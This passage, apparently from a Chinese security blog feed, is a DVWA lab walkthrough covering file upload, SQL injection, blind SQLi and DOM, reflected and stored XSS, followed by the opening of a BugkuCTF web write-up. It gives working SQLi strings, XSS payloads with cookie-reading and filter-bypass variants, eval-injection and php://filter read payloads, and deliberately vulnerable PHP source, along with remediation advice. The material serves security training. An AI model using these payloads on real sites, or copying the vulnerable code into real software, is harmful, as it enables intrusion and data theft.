class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">"jpg"</span> || strtolower( $uploaded_ext ) == <span class="string">"jpeg"</span> || strtolower( $uploaded_ext ) == <span class="string">"png"</span> ) &amp;&amp;</span><br><span class="line">( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line"><span class="keyword">if</span>( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;</span><br><span class="line"><span class="comment">// No</span></span><br><span class="line">$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Yes!</span></span><br><span class="line">$html .= <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Invalid file</span></span><br><span class="line">$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错</p><p>采用%00截断，还有系统的copy命令，将图片和脚本融合在一起…</p><h2 id="Impossible-3"><a href="#Impossible-3" class="headerlink" title="Impossible"></a>Impossible</h2><p>Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p><h2 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h2><p><strong>转载自红日安全《DVWA 漏洞测试平台分析》：</strong></p><blockquote><ul><li>设置项目目录权限：可写目录不执行，执行目录不可写</li><li>使用白名单机制对文件类型(mine-type)和文件后缀进行限制</li><li>对上传文件大小进行限制</li><li>文件存储到服务器时文件名称随机化，禁止使用用户上传指定的文件名称</li><li>针对图片文件使用压缩或重设图片像素大小</li><li>上传文件存放在独立服务器使用</li></ul></blockquote><p><br><br></p><h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><p>由于学习sql有一段时间了，所以这章略写</p><h2 id="Low-4"><a href="#Low-4" class="headerlink" title="Low"></a>Low</h2><p>字符型注入，直接<code>id=1&#39; or 1=1#</code>闭合即可</p><h2 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h2><p>整型注入，由于只能有复选框，所以直接burpsuite抓包，再进行修改 <code>id=1 or 1=1</code>即可</p><h2 id="High-4"><a href="#High-4" class="headerlink" title="High"></a>High</h2><p>直接注入，#号注释掉后面的语句即可</p><h2 id="Impossible-4"><a href="#Impossible-4" class="headerlink" title="Impossible"></a>Impossible</h2><h2 id="修复建议-4"><a href="#修复建议-4" class="headerlink" title="修复建议"></a>修复建议</h2><p><strong>转载自红日安全《DVWA 漏洞测试平台分析》：</strong></p><blockquote><ul><li>使用预处理方式将数据和操作分离（在 SQL 中使用?占位数据）</li><li>对数据严格进行类型和格式检查</li><li>使用安全函数对数据进行转义</li><li>避免 web 服务器启动和数据库操作用户权限过高</li></ul></blockquote><p><br><br></p><h1 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h1><p>详版请见：<a href="https://www.freebuf.com/articles/web/120985.html" target="_blank" rel="noopener">DVWA-1.9全级别教程之SQL Injection(Blind) </a></p><h2 id="Low-5"><a href="#Low-5" class="headerlink" title="Low"></a>Low</h2><p>盲注没有回显，利用burpsuite的重放模块来攻击</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line">$id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check database</span></span><br><span class="line">$getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Get results</span></span><br><span class="line">$num = @mysqli_num_rows( $result ); <span class="comment">// The '@' character suppresses errors</span></span><br><span class="line"><span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line">$html .= <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// User wasn't found, so the page wasn't!</span></span><br><span class="line">header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line">$html .= <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>GET了id之后直接拼到查询语句中。</p><ul><li><p>payload：<br><code>1 or 1=1</code><br><code>1 and 1=2</code><br><code>1&#39; or &#39;1&#39;=&#39;1</code><br><code>1&#39; and &#39;1&#39;=&#39;2</code></p></li><li><p>如何使用burpsuite：</p></li></ul><p><img src="/.com//15.png" alt><br><img src="/.com//16.png" alt><br><img src="/.com//17.png" alt></p><ul><li><strong>使用sqlmap</strong></li></ul><p><img src="/.com//18.png" alt><br><img src="/.com//19.png" alt></p><h2 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h2><p><img src="/.com//21.png" alt></p><h2 id="High-5"><a href="#High-5" class="headerlink" title="High"></a>High</h2><p><img src="/.com//20.png" alt></p><h2 id="Impossible-5"><a href="#Impossible-5" class="headerlink" title="Impossible"></a>Impossible</h2><p>Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。 </p><h2 id="修复建议-5"><a href="#修复建议-5" class="headerlink" title="修复建议"></a>修复建议</h2><p><strong>转载自红日安全《DVWA 漏洞测试平台分析》：</strong></p><ul><li>使用预处理方式将数据和操作分离（在 SQL 中使用?占位数据）</li><li>对数据严格进行类型和格式检查（url，post data，cookie 等用户可以控制的数据）</li><li>使用安全函数对数据进行转义</li><li>避免 web 服务器启动和数据库操作用户权限过高</li></ul><p><br><br></p><h1 id="XSS-DOM"><a href="#XSS-DOM" class="headerlink" title="XSS(DOM)"></a>XSS(DOM)</h1><h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><p><strong>我的分析（成功思路）：</strong><br>一个复选框可以选很多语言，且URL直接可以控制参数<br><img src="/.com//11.png" alt></p><p>观察源码，没有对输入的参数过滤的东西</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#No protections, anything goes</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接改变浏览器传入的参数<code>localhost/DVWA/vulnerabilities/xss_d/?default=&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;</code></p><h2 id="Medium-6"><a href="#Medium-6" class="headerlink" title="Medium"></a>Medium</h2><p><strong>我的分析（失败）</strong><br>看一波源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*array_key_exists（）检查某个数组中是否存在指定的键名</span></span><br><span class="line"><span class="comment">*检测"default"是否在GET这个变量中和GET传入的参数值不为空</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">"default"</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">'default'</span> ]) ) &#123;</span><br><span class="line">$default = $_GET[<span class="string">'default'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*stripos()函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）*/</span></span><br><span class="line"><span class="comment"># Do not allow script tags</span></span><br><span class="line"><span class="keyword">if</span> (stripos ($default, <span class="string">"&lt;script"</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">header (<span class="string">"location: ?default=English"</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>个人最开始认为这个源码的着重点在 stripos上面，检测了<code>&lt;script</code>这个东西，而且不区分大小写，检测到了就让<code>default=English</code></p><p><strong>大佬的分析</strong><br> <strong>方法一</strong><br>可以看到，medium级别的代码先检查了default参数是否为空<br>如果不为空则将default等于获取到的default值。<br>这里还使用了stripos 用于检测default值中是否有 <code>&lt;script</code>，如果有的话，则将 default=English 。</p><p>很明显，这里过滤了 <code>&lt;script</code> (不区分大小写)，那么我们可以使用<code>&lt;img  src=1  onerror=(&#39;hack&#39;)&gt;</code><br><strong>onerror是IMG标记的一个事件，页面发生错误，该事件被激活。上例，解释IMG标记时，加载src属性引用的图片地址，若图片不存在就触发onerror事件</strong></p><p>查看网页源代码<br><img src="/.com//12.png" alt></p><p>发现要独立出<code>&lt;img&gt;</code>标签才能弹窗，需要闭合前面的<code>&lt;option&gt;和&lt;select&gt;</code>所以构造语句</p><pre><code>?default=&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&apos;1&apos;)&gt;/* &gt;是用来闭合前面的 &lt;option* &lt;/option&gt;闭合前面的&lt;option&gt;* &lt;/select&gt;闭合前面的&lt;select&gt;* 这样才能使&lt;img&gt;标签逃离出来*/</code></pre><p>** 方法二**url中有一个字符为    <code>#</code>，该字符后的数据不会发送到服务器端，从而绕过服务端过滤，构造连接为</p><p><strong>注意#号的位置</strong><br><code>?#default=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p><h2 id="High-6"><a href="#High-6" class="headerlink" title="High"></a>High</h2><p><strong>我的分析（失败）</strong><br>先看一波后端源码，发现进行switch语句，直接列出了所有选项，不知道怎么绕过…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="comment">/*检测default这个参数是否被设置和是否为空</span></span><br><span class="line"><span class="comment">*不为空且被设置进入switch语句</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">"default"</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">'default'</span> ]) ) &#123;</span><br><span class="line"><span class="comment">//下面直接列出了所有的情况</span></span><br><span class="line"><span class="comment"># White list the allowable languages</span></span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'default'</span>]) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"French"</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">"English"</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">"German"</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">"Spanish"</span>:</span><br><span class="line"><span class="comment"># ok</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">header (<span class="string">"location: ?default=English"</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>大佬的分析</strong></p><p>其实同Medium的方法二一样，url中有一个字符为    <code>#</code>，该字符后的数据不会发送到服务器端，从而绕过服务端过滤<br>构造语句<br><code>http://localhost/DVWA/vulnerabilities/xss_d/?#default=English&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><h2 id="Impossible-6"><a href="#Impossible-6" class="headerlink" title="Impossible"></a>Impossible</h2><p>分析一波后端源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Don't need to do anything, protction handled on the client side</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>好吧没什么可以分析的…</p><p>我们查看网页源代码，发现这里对我们输入的参数并没有进行URL解码，所以我们输入的任何参数都是经过URL编码，然后直接赋值给option标签。所以，就不存在XSS漏洞了。</p><h2 id="修复建议-6"><a href="#修复建议-6" class="headerlink" title="修复建议"></a>修复建议</h2><p><strong>转载自红日安全《DVWA 漏洞测试平台分析》：</strong></p><ul><li><p>禁用 js 读取 cookie(设置 cookie 为 httponly)</p></li><li><p>在页面输出数据时对<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、 <code>&#39;</code>、<code>&quot;</code>、<code>/</code>等字符进行 html 实体转义</p></li><li><p>对输入数据中<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、 <code>&#39;</code>、<code>&quot;</code>进行严格检查</p></li></ul><p><br><br></p><h1 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS(Reflected)"></a>XSS(Reflected)</h1><h2 id="Low-6"><a href="#Low-6" class="headerlink" title="Low"></a>Low</h2><p><strong>我的分析（成功思路）</strong><br>查看后端源代码</p><p>Low级别还是没进行参数过滤，存在反射型xss漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//传入参数未经过滤，直接输出</span></span><br><span class="line">$html .= <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造语句,成功弹窗<br><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><p><strong>大佬的分析</strong><br>略…<br><strong>补充一波payload</strong></p><ol><li><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></li><li><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li><li><code>&lt;img src=&quot;&quot; onerror=&quot;alert(/xss/)&quot;/&gt;</code></li><li><code>&lt;iframe src=&quot;&quot; onload=&quot;alert(document.cookie)&quot;&gt;&lt;/iframe&gt;</code></li></ol><h2 id="Medium-7"><a href="#Medium-7" class="headerlink" title="Medium"></a>Medium</h2><p><strong>我的分析（成功思路）</strong><br>源码中发现· str_replace·函数，它只删除一次标签，采用双写绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line">$name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line">$html .= <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>大佬的分析</strong><br><strong>补充一波payload</strong><br>双写绕过检测的标签<br><code>&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;</code></p><p>大小写混写绕过检测的标签<br><code>&lt;sCrIpt&gt;alert(document.cookie)&lt;/scRipT&gt;</code></p><p>以下两种由于没有<code>&lt;script&gt;</code>标签，所以检测不到，可以直接使用<br><code>&lt;img src=&quot;&quot; onerror=&quot;alert(/xss/)&quot;/&gt;</code></p><p><code>&lt;iframe src=&quot;&quot; onload=&quot;alert(document.cookie)&quot;&gt;&lt;/iframe&gt;</code></p><h2 id="High-7"><a href="#High-7" class="headerlink" title="High"></a>High</h2><p><strong>我的分析（成功思路）</strong><br>查看源码发现使用了正则表达式来过滤掉s c r i p t 这几个字母，相当于删去了<code>&lt;script&gt;</code>这个标签</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line">$name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line">$html .= <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我看了之后想到了另外两个payload<br><code>&lt;img src=&quot;&quot; onerror=&quot;alert(/xss/)&quot;/&gt;</code></p><p><code>&lt;iframe src=&quot;&quot; onload=&quot;alert(document.cookie)&quot;&gt;&lt;/iframe&gt;</code></p><h2 id="Impossible-7"><a href="#Impossible-7" class="headerlink" title="Impossible"></a>Impossible</h2><p>直接实体化了输入的东西，禁用掉了xss</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input，直接实体化了html</span></span><br><span class="line">$name = htmlspecialchars( $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line">$html .= <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="修复建议-7"><a href="#修复建议-7" class="headerlink" title="修复建议"></a>修复建议</h2><p><strong>转载自红日安全《DVWA 漏洞测试平台分析》：</strong></p><ul><li><p>禁用 js 读取 cookie(设置 cookie 为 httponly)</p></li><li><p>在页面输出数据时对<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、 <code>&#39;</code>、<code>&quot;</code>、<code>/</code>等字符进行 html 实体转义</p></li><li><p>对输入数据中<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、 <code>&#39;</code>、<code>&quot;</code>进行严格检查</p></li></ul><p><br><br></p><h1 id="XSS-Stored"><a href="#XSS-Stored" class="headerlink" title="XSS(Stored)"></a>XSS(Stored)</h1><h2 id="全等级"><a href="#全等级" class="headerlink" title="全等级"></a>全等级</h2><p>这个同反射型xss大致相同。需要注意的是多加了几个函数。而且需要看后端源码来看哪里存在注入点。</p><p>而且存储型相比于反射型是，只要访问该页面的用户都会触发xss。</p><h2 id="修复建议-8"><a href="#修复建议-8" class="headerlink" title="修复建议"></a>修复建议</h2><p><strong>转载自红日安全《DVWA 漏洞测试平台分析》：</strong></p><ul><li><p>禁用 js 读取 cookie(设置 cookie 为 httponly)</p></li><li><p>在页面输出数据时对<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、 <code>&#39;</code>、<code>&quot;</code>、<code>/</code>等字符进行 html 实体转义</p></li><li><p>对输入数据中<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、 <code>&#39;</code>、<code>&quot;</code>进行严格检查</p></li></ul><p><br><br><br></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugkuCTF Writeup</title>
      <link href="/2019/03/05/BugkuCTF-Web-writeup/"/>
      <url>/2019/03/05/BugkuCTF-Web-writeup/</url>
      
        <content type="html"><![CDATA[<p>记录了一些题目…</p><a id="more"></a><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>域名解析的概念：域名解析是把域名指向网站空间IP，让人们通过注册的域名可以方便地访问到网站的一种服务。IP地址是网络上标识站点的数字地址，为了方便记忆，采用域名来代替IP地址标识站点地址。域名解析就是域名到IP地址的转换过程。域名的解析工作由DNS服务器完成。</p><p>在 C:\Windows\System32\drivers\etc\hosts ,Windows系统下有一个hosts文件,Windows系统下有一个hosts文件,在最后一行添加：123.206.87.240 flag.baidu.com </p><p>在浏览器搜索栏访问：flag.baidu.com ， 得到flag…</p><p><br><br><br></p><h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><p>分析源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>; <span class="comment">//包含一个flag文件</span></span><br><span class="line">    $a = @$_REQUEST[<span class="string">'hello'</span>]; <span class="comment">//$_REQUEST: 可以获取以POST方法和GET方法提交的数据，获取hello的参数，并对a赋值</span></span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>); <span class="comment">//eval存在命令执行漏洞，var_dump（）: 函数用于输出变量的相关信息</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>方法一：<br>eval存在命令执行漏洞，使用hello构造payload <code>?hello=);show_source(%27flag.php%27);var_dump(</code></li></ul><ul><li>方法二：<br>在URL处构造<code>?hello=1);include $_POST[&#39;b&#39;];</code><br>然后使用hackbar post这个参数，使用伪协议读取flag <code>b=php://filter/convert.base64-encode/resource=flag.php</code><br>将flag文件通过base64编码弹回来，然后进行一次base64解码，即可得到flag…</li></ul><ul><li>方法三<br>直接将flag.php文件读入变量hello中<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?hello=get_file_contents(&apos;flag.php&apos;)</span><br><span class="line">?hello=file(&apos;flag.php&apos;)</span><br></pre></td></tr></table></figure></li></ul><p><br><br><br></p><h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p>分析源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);<span class="comment">//关闭错误报告</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag1.php"</span>;<span class="comment">//包含一个flag文件</span></span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);<span class="comment">//highlight_file() 函数对文件进行语法高亮显示。</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'args'</span>]))&#123;<span class="comment">//检查</span></span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];<span class="comment">//赋值</span></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,$args))&#123;<span class="comment">//进行正则匹配，\w表示任意一个单词字符，即[a-zA-Z0-9_]</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"args error!"</span>);<span class="comment">//没匹配成功就退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"var_dump($$args);"</span>);<span class="comment">//打印变量，$$args 可以理解为$($args)</span></span><br><span class="line">&#125;</span><br><span class="line"><span 